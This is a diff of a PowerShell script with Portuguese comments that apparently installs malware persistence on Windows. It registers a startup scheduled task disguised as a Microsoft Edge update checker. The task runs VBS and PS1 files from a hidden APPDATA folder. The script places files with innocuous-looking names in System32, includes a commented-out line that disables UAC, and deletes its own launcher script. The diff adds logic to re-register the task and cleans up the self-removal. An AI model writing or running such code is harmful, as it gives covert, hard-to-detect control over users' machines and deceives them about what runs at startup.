@@ -1,8 +1,9 @@
 $taskName = "MicrosoftEdgeUpdateChecker{C599C82-62E9-42CB-98E3-683A5482339}"
 $sessionUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$perFolder = Join-Path $env:APPDATA "Observer"
+$perFolder = Join-Path $env:APPDATA "ObvServer"
 $perCheck = Join-Path $perFolder "perCheck.ps1"
 $perCheckVbs = Join-Path $perFolder "perCheck.vbs"
+$run = Join-Path $env:APPDATA "run.ps1"
 $destino = 'C:\Windows\System32\Int-service.exe'
 $destino2 = 'C:\Windows\System32\ap32\log.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
@@ -94,10 +95,12 @@ if (Test-IsAdmin) {
     #New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
 
     Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false
+    
     Remove-Item $perFolder -Recurse -Force
-    if (Test-Path Join-Path `$env:APPDATA "run.ps1") {
-        Remove-Item Join-Path `$env:APPDATA "run.ps1" -Force
-    }    
+    
+    if (Test-Path $run) {
+        Remove-Item $run -Force
+    }
     exit
 }
 "@
@@ -114,6 +117,12 @@ Set-Content -Path $perCheckVbs -Value $vbsContent -Encoding ASCII
 
 
 # Criar ação da tarefa
+    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+
+    if ($existingTask) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    }
+
     $action = New-ScheduledTaskAction -Execute "$perCheckVbs"
 
     # Criar trigger para rodar quando o computador iniciar
@@ -127,6 +136,6 @@ Set-Content -Path $perCheckVbs -Value $vbsContent -Encoding ASCII
     # Rodar a tarefa
     #Start-ScheduledTask -TaskName $taskName
 
-if (Test-Path Join-Path $env:APPDATA "run.ps1") {
-    Remove-Item Join-Path $env:APPDATA "run.ps1" -Force
+if (Test-Path $run) {
+    Remove-Item $run -Force
 }    
